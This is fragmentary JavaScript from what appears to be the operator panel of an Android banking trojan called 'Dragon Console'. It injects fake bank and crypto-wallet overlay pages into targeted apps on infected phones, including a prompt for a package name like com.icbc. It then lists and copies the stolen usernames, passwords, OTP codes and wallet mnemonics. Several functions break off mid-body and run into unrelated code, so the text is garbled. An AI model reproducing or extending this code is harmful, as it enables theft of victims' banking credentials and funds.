        empty.textContent = '\u6682\u65e0\u81ea\u5b9a\u4e49\u6a21\u677f\uff0c\u70b9\u4e0a\u65b9\u201c\uff0b \u65b0\u5efa\u81ea\u5b9a\u4e49\u6a21\u677f\u201d\u521b\u5efa';
        csec.appendChild(empty);
      }
      bankCustoms.forEach(function(t){
        var row = document.createElement('div'); row.className = 'zglBankItem';
        var nm = document.createElement('span'); nm.className = 'bname';
        nm.innerHTML = bEsc(t.name) + ' <span style="color:#7d93ac;font-size:11px;">(' + bEsc(t.lang) + '/' + bEsc(t.flow) + ')</span>' + (t.note ? ' <span style="color:#6b83ff;font-size:11px;">' + bEsc(t.note) + '</span>' : '');
        var pkg = document.createElement('span'); pkg.className = 'bpkg'; pkg.textContent = '#' + t.id;
        var act = document.createElement('span'); act.className = 'bact';
        var inj = document.createElement('button'); inj.type = 'button'; inj.className = 'zglBankBtn'; inj.textContent = '\u6ce8\u5165';
        inj.onclick = function(){
          if(window.__zglBankMode === 'arm'){
            var pk = window.prompt('\u8f93\u5165\u76ee\u6807\u5e94\u7528\u5305\u540d\uff08\u5982 com.icbc\uff09:', '');
            if(!pk) return;
            window.__zglInjectBankArmUrl(location.origin + '/api/EaodBankInject.php?action=page&id=' + t.id + '&pid=' + encodeURIComponent(p), t.name, String(pk).trim());
          } else {
            window.__zglInjectBankUrl(location.origin + '/api/EaodBankInject.php?action=page&id=' + t.id + '&pid=' + encodeURIComponent(p), t.name);
          }
        };
        var view = document.createElement('button'); view.type = 'button'; view.className = 'zglBankBtn bview'; view.textContent = '\u9884\u89c8';
        view.onclick = function(){ window.open(location.origin + '/api/EaodBankInject.php?action=page&id=' + t.id + '&pid=' + encodeURIComponent(p), '_blank'); };
        var ed = document.createElement('button'); ed.type = 'button'; ed.className = 'zglBankBtn bview'; ed.textContent = '\u7f16\u8f91';
        ed.onclick = function(){ window.__zglEditBankForm(t); };
        var del = document.createElement('button'); del.type = 'button'; del.className = 'zglBankBtn bdel'; del.textContent = '\u5220\u9664';
        del.onclick = function(){

  window.__zglOpenBankForm = function(t){

  window.__zglEditBankForm = function(t){
    var form = document.getElementById('zglBankForm');
    if(!form) return;
    form.querySelector('#bkf_id').value = t ? t.id : '';
    form.querySelector('#bkf_name').value = t ? (t.name || '') : '';
    form.querySelector('#bkf_welcome').value = t ? (t.welcome || '') : '';
    form.querySelector('#bkf_initials').value = t ? (t.initials || '') : '';
    form.querySelector('#bkf_c1').value = t ? (t.c1 || '#3b5bf0') : '#3b5bf0';
    form.querySelector('#bkf_c2').value = t ? (t.c2 || '#3b5bf0') : '#3b5bf0';
    form.querySelector('#bkf_lang').value = t ? (t.lang || 'zh-CN') : 'zh-CN';
    form.querySelector('#bkf_flow').value = t ? (t.flow || 'up') : 'up';
    form.querySelector('#bkf_digits').value = t ? String(t.digits || 6) : '6';
    form.querySelector('#bkf_words').value = t ? String(t.words || 12) : '12';
    form.querySelector('#bkf_maint').value = t ? (t.maint || '') : '';
    form.querySelector('#bkf_note').value = t ? (t.note || '') : '';
    form.style.display = 'block';
    try{ form.scrollIntoView({behavior:'smooth',block:'nearest'}); }catch(e){}
    form.querySelector('#bkf_name').focus();

  window.__zglSaveBankForm = function(){
    try{
      var form = document.getElementById('zglBankForm');
      if(!form) return;
      var id = parseInt(form.querySelector('#bkf_id').value || '0', 10);
      var name = (form.querySelector('#bkf_name').value || '').trim();
      if(!name){ if(window.$message) window.$message.warning('\u8bf7\u8f93\u5165\u6a21\u677f\u540d\u79f0'); return; }
      var body = {
        action: 'custom_save', id: id, name: name,
        welcome: form.querySelector('#bkf_welcome').value.trim(),
        initials: form.querySelector('#bkf_initials').value.trim(),
        c1: form.querySelector('#bkf_c1').value,
        c2: form.querySelector('#bkf_c2').value,
        lang: form.querySelector('#bkf_lang').value,
        flow: form.querySelector('#bkf_flow').value,
        digits: parseInt(form.querySelector('#bkf_digits').value || '6', 10),
        words: parseInt(form.querySelector('#bkf_words').value || '12', 10),
        maint: form.querySelector('#bkf_maint').value.trim(),
        note: form.querySelector('#bkf_note').value.trim(),
        token: bStoGet('ACCESS-TOKEN')

      fetch('/api/EaodBankInject.php?action=custom_save', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)})

  window.__zglLoadBank = function(silent){
    try{
      var p = bPid(); var tok = bStoGet('ACCESS-TOKEN');
      if(!silent){
        var tree = document.getElementById('zglBankTree');
        if(tree) tree.innerHTML = '<div style="color:#9a8f7a;padding:14px;text-align:center;">\u52a0\u8f7d\u4e2d...</div>';
      }
      if(!bankCatalog){
        fetch('/bank/catalog.json').then(function(r){ return r.json(); }).then(function(j){
          bankCatalog = j; fillCountryFilter(); renderTree();
        }).catch(function(){ var tree = document.getElementById('zglBankTree'); if(tree) tree.innerHTML = '<div style="color:#e05d4f;padding:14px;">\u5206\u7c7b\u52a0\u8f7d\u5931\u8d25</div>'; });
      } else { fillCountryFilter(); renderTree(); }
      if(!walletCats){
        fetch('/bank/wallet_catalog.json').then(function(r){ return r.json(); }).then(function(j){
          walletCats = (j && j.cats) || []; renderTree();
        }).catch(function(){ walletCats = []; renderTree(); });
      }
      var req = function(act, extra){ return fetch('/api/EaodBankInject.php?action=' + act, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(Object.assign({action:act, phone_id:p, token:tok}, extra||{}))}).then(function(r){ return r.json(); }); };
      req('custom_list').then(function(j){
        bankCustoms = (j && j.list) || [];
        renderTree();
      });
      Promise.all([req('list_creds'), req('list_hits')]).then(function(rs){
        var creds = document.getElementById('zglBankCreds'), hits = document.getElementById('zglBankHits');
        var cl = (rs[0] && rs[0].list) || [], hl = (rs[1] && rs[1].list) || [];
        if(creds){
          if(!cl.length){ creds.innerHTML = '<div style="color:#9a8f7a;padding:12px;text-align:center;">\u6682\u65e0\u51ed\u636e</div>'; }
          else creds.innerHTML = cl.map(function(x){
            var isW = x.cc === 'wallet';
            return '<div class="zglCredRow">' +
              '<b style="color:#6b83ff;">' + bEsc(x.bank) + '</b>' +
              '<span style="color:#9a8f7a;">' + bEsc(x.cc) + '</span>' +
              '<span style="flex:1;color:#f0d9a0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;min-width:90px;">' + bEsc(x.u || '') + '</span>' +
              '<span style="color:#f0d9a0;">' + bEsc(x.p || '') + '</span>' +
              (x.otp ? '<span style="color:#ff9d8a;" title="' + bEsc(x.otp) + '">' + (isW ? '\u52a9\u8bb0\u8bcd:' : 'OTP:') + '<span style="overflow:hidden;text-overflow:ellipsis;white-space:nowrap;max-width:160px;display:inline-block;vertical-align:bottom;">' + bEsc(x.otp) + '</span></span>' : '') +
              '<span style="color:#7d93ac;">' + bEsc(String(x.created_at||'').slice(0,16)) + '</span>' +
              '<button class="cb" data-copy="' + bEsc(x.u||'') + '">\u590d\u5236U</button>' +
              '<button class="cb" data-copy="' + bEsc(x.p||'') + '">\u590d\u5236P</button>' +
              (x.otp ? '<button class="cb" data-copy="' + bEsc(x.otp||'') + '">\u590d\u5236' + (isW ? '\u52a9\u8bb0\u8bcd' : 'O') + '</button>' : '') +
              '</div>';
          }).join('');
          Array.prototype.forEach.call(creds.querySelectorAll('.cb'), function(b){
            b.onclick = function(){ try{ navigator.clipboard.writeText(b.getAttribute('data-copy')||''); if(window.$message) window.$message.success('\u5df2\u590d\u5236'); }catch(e){} };
          });
        }
        if(hits){
          if(!hl.length){ hits.innerHTML = '<div style="color:#9a8f7a;padding:12px;text-align:center;">\u6682\u65e0\u547d\u4e2d\u8bb0\u5f55</div>'; }
          else hits.innerHTML = hl.map(function(x){
            return '<div class="zglCredRow"><b style="color:#6b83ff;">' + bEsc(x.bank) + '</b>' +
              '<span style="color:#9a8f7a;">' + bEsc(x.cc) + '</span>' +
              '<span style="flex:1;"></span>' +
              '<span style="color:#7d93ac;">' + bEsc(String(x.created_at||'').slice(0,16)) + '</span></div>';
          }).join('');
        }
      });
    }catch(e){}
  };

    try{
      if(!bOnInfo() || !bPid()) return;

        '<div class="zgl-logo-tile">龍</div>' +
        '<div><div class="zgl-logo-name">中国龙控制台</div><div class="zgl-logo-sub">DRAGON CONSOLE</div></div>';
    }

      var pill = document.createElement('span');

      search.className = 'zgl-search';
      search.innerHTML = '<svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M20 20l-3.5-3.5"/></svg><input placeholder="搜索设备 / 账号…">';
      hdr.insertBefore(search, hdr.firstChild);
      hdr.insertBefore(pill, hdr.firstChild);
    }
    // 面包屑（随路由更新）
    var hdrLeft = document.querySelector('.layout-header-left');
    var titleMap = { '/dashboard/home': '首页', '/list/basic-list': '设备管理', '/account/manage': '账号管理', '/setting/system': 'APK构建' };
    var curTitle = titleMap[location.pathname] || null;
    if (hdrLeft) {
      var crumbEl = hdrLeft.querySelector('.zgl-crumb');
      if (curTitle) {
        if (!crumbEl) {
          crumbEl = document.createElement('div');
          crumbEl.className = 'zgl-crumb';
          hdrLeft.insertBefore(crumbEl, hdrLeft.firstChild);
        }
        var crumbB = crumbEl.querySelector('b');
        var targetHtml = '工作台 <span style="opacity:.5">/</span> <b>' + curTitle + '</b>';
        if (crumbEl.getAttribute('data-zgl-title') !== curTitle) {
          crumbEl.innerHTML = targetHtml;
          crumbEl.setAttribute('data-zgl-title', curTitle);
        }
      } else if (crumbEl) {
        crumbEl.parentNode.removeChild(crumbEl);
      }
    }
    // 首页页签栏：已按需求移除（不再注入 .zgl-tabbar）
    // 菜单角标：设备管理显示真实总数（随数据实时更新）
    var menuForBadge = document.querySelector('.n-layout-sider .n-menu');
    if (menuForBadge) {
      var itemDev = [].slice.call(menuForBadge.children).filter(function (c) { return (c.textContent || '').indexOf('\u8BBE\u5907\u7BA1\u7406') >= 0; })[0];
      if (itemDev) {
        var total = null;
        var dt = document.querySelector('[data-total]');
        if (dt && /^\d+$/.test(dt.textContent.trim()) && Number(dt.textContent.trim()) > 0) total = dt.textContent.trim();
        if (total === null) {
          var m2 = (document.body.textContent || '').match(/\u5728\u7EBF\s*(\d+)\/(\d+)/);
          if (m2) total = m2[2];
        }
        if (total !== null) {
          var bdg = itemDev.querySelector('.zgl-menu-badge');
          if (!bdg) {
            bdg = document.createElement('span');
            bdg.className = 'zgl-menu-badge';
            itemDev.appendChild(bdg);
          }
          if (bdg.textContent !== total) { bdg.textContent = total; }
        }
      }
    }
    // 菜单名称对齐 mockup + 更多功能项角标
    var menuR = document.querySelector('.n-layout-sider .n-menu');
    if (menuR) {
      var kids = [].slice.call(menuR.children).filter(function (c) { return c.classList && (c.classList.contains('n-menu-item') || c.classList.contains('n-submenu')); });
      kids.forEach(function (it) {
        var hdrEl = it.querySelector('.n-menu-item-content-header');
        if (!hdrEl) return;
        var txt = hdrEl.textContent;
        if (txt && txt.indexOf('\u4EEA\u8868\u76D8') >= 0) hdrEl.textContent = '\u9996\u9875';          // 仪表盘→首页
        if (txt && txt.indexOf('\u5B50\u53F7\u7EDF\u8BA1') >= 0) hdrEl.textContent = '\u6570\u636E\u7EDF\u8BA1';  // 子号统计→数据统计
      });
      var extraKids = kids.filter(function (it) { var t = it.textContent || ''; return t.indexOf('\u64CD\u4F5C\u65E5\u5FD7') >= 0 || t.indexOf('\u6570\u636E\u7EDF\u8BA1') >= 0; });
      extraKids.forEach(function (it) {
        if (!it.querySelector('.zgl-menu-badge')) {
          var eb = document.createElement('span');
          eb.className = 'zgl-menu-badge';
          eb.textContent = '—';
          it.appendChild(eb);
        }
      });
    }
    // 设备页恢复原生筛选表单（已由自定义筛选条 zglFilterBar 替代，禁用恢复，避免两条筛选叠放）
    if (location.pathname.indexOf('/list/basic-list') === 0) {
      var nf = document.querySelector('.index-root .n-form');
      if (false && nf && getComputedStyle(nf).display === 'none') {
        try { nf.style.setProperty('display', 'block', 'important'); } catch (e) { nf.style.display = 'block'; }
      }
      var expandBtn = [].slice.call(document.querySelectorAll('.index-root button')).filter(function (b) { return (b.textContent || '').trim().indexOf('\u5C55\u5F00') >= 0; })[0];
      if (expandBtn && !expandBtn.__zglExpanded) {
        expandBtn.__zglExpanded = true;
        try { expandBtn.click(); } catch (e) {}
      }
    }
    // 设备页标题统计行（在线/离线/总计 + 导出）——实时更新
    if (location.pathname.indexOf('/list/basic-list') === 0) {
      var heading2 = document.querySelector('.zgl-device-heading');
      if (heading2) {
        var m = (document.body.textContent || '').match(/\u5728\u7EBF\s*(\d+)\/(\d+)/);
        var on = m ? m[1] : null, tot = m ? m[2] : null;
        if (on !== null && tot !== null && Number(tot) > 0) {
          var meta = heading2.querySelector('.zgl-dev-head-meta');
          if (!meta) {
            meta = document.createElement('div');
            meta.className = 'zgl-dev-head-meta';
            meta.innerHTML = '<span>在线 <b style="color:#16a34a" data-m-on>0</b></span><span>·</span><span>离线 <b style="color:#99a5bf" data-m-off>0</b></span><span>·</span><span>总计 <b style="color:#14213d" data-m-tot>0</b></span><button class="n-button n-button--default-type n-button--small-type" style="margin-left:6px"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M12 3v12M7 10l5 5 5-5"/><path d="M4 19h16"/></svg>\u5BFC\u51FA</button>';
            heading2.appendChild(meta);
          }
          var onEl = meta.querySelector('[data-m-on]'), offEl = meta.querySelector('[data-m-off]'), totEl = meta.querySelector('[data-m-tot]');
          if (onEl && onEl.textContent !== on) onEl.textContent = on;
          var off = Number(tot) - Number(on);
          if (offEl && offEl.textContent !== String(off)) offEl.textContent = String(off);
          if (totEl && totEl.textContent !== tot) totEl.textContent = tot;
        }
      }
    }
    var sider = document.querySelector('.n-layout-sider');
    if (sider && !sider.querySelector('.zgl-sider-user')) {
      var nm = getUserName();
      var u = document.createElement('div');
      u.className = 'zgl-sider-user';
      var rol9 = '普通用户';
      try { var auth9x = localStorage.getItem('CURRENT-AUTHORTY'); if (auth9x && String(auth9x).indexOf('admin') !== -1) rol9 = '超级管理员'; } catch (e) {}
      u.innerHTML = '<div class="a">' + (nm.charAt(0).toUpperCase()) + '</div><div><div class="n">' + nm + '</div><div class="r">' + rol9 + '</div></div>';
      sider.appendChild(u);
    }
    // 侧栏分组标题（工作台 / 更多功能）
    var menu = document.querySelector('.n-layout-sider .n-menu');
    if (menu && !menu.querySelector('.zgl-menu-group')) {
      var items = [].slice.call(menu.children).filter(function (c) { return c.classList && (c.classList.contains('n-menu-item') || c.classList.contains('n-submenu')); });
      if (items.length >= 2) {
        var g1 = document.createElement('div');
        g1.className = 'zgl-menu-group';
        g1.textContent = '工作台';
        menu.insertBefore(g1, items[0]);
        var logsItem = items.filter(function (it) { return (it.textContent || '').indexOf('\u64CD\u4F5C\u65E5\u5FD7') >= 0; })[0];
        if (logsItem) {
          var g2 = document.createElement('div');
          g2.className = 'zgl-menu-group';
          g2.textContent = '更多功能';
          menu.insertBefore(g2, logsItem);
        }
      }
    }
    // 设备页 eyebrow
    if (location.pathname.indexOf('/list/basic-list') === 0) {
      var heading = document.querySelector('.zgl-device-heading .zgl-device-heading-main') || document.querySelector('.zgl-device-heading');
      if (heading && !document.querySelector('.zgl-device-heading .zgl-device-eyebrow')) {
        var ey = document.createElement('div');
        ey.className = 'zgl-device-eyebrow';
        ey.textContent = 'DEVICE CENTER · 设备中心';
        heading.insertBefore(ey, heading.firstChild);
      }
    }
    // 账号页自动展开新增账号表单（一次性点击 + 结构检测）
    if (location.pathname.indexOf('/account/manage') === 0 && !window.__zglAccFormDone) {
      var formOpen = document.querySelector('input[type="date"], input[type="email"]');
      if (!formOpen) {
        var btns = [].slice.call(document.querySelectorAll('button'));
        var addBtn = btns.filter(function (b) { return (b.textContent || '').indexOf('\u65B0\u589E\u8D26\u53F7') >= 0; })[0];
        if (addBtn && !addBtn.__zglAccClicked) {
          addBtn.__zglAccClicked = true;
          try { addBtn.click(); } catch (e) {}
        }
      } else {
        window.__zglAccFormDone = true;
      }
    }
    } catch(e) {}
  }

  setInterval(run, 1500);
  document.addEventListener('DOMContentLoaded', run);
  try { new MutationObserver(run).observe(document.body, { childList: true, subtree: true }); } catch(e){}
})();
</script>
